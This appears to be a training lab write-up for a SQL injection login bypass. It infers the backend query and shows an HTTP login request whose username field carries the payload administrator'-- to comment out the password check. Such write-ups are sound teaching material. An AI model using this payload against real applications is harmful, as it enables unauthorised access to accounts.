# Lab 02: SQL injection vulnerability allowing login bypass

## Description

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

---

## Solution

Since the login function is vulnerable to SQL injection and the challenge is to bypass authentication, the SQL query sent to the database can reasonably assumed to look like:

```sql
SELECT * from users where username = 'USERNAME' and password = 'PASSWORD';
```

where `USERNAME` AND `PASSWORD` are the user-input credentials.

The backend code that is authenticating the user probably issues this request to the database and then if it returns at least (or exactly) one row, the user is successfully authenticated.

The username is `administrator`, but the password is unknown. To get the SQL query to return at least one row, the username can be manipulated to ignore the password equality condition, like so (some HTTP headers removed for brevity):

```http
POST /login HTTP/1.1
Host: acb51f2f1ef22cc780680721005e00ce.web-security-academy.net
Cookie: session=oKMHLIlgaSjUunlWGPEg1s8oFGc06mQB
Content-Length: 81
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Connection: close

username=administrator'--&password=password&csrf=hEUOmnZQ5Kh8Yuhoywn3JvFrW5jeYl3S&
```

resuling in the following SQL query:

```sql
SELECT * from users where username = 'administrator'--' and password = 'PASSWORD';
```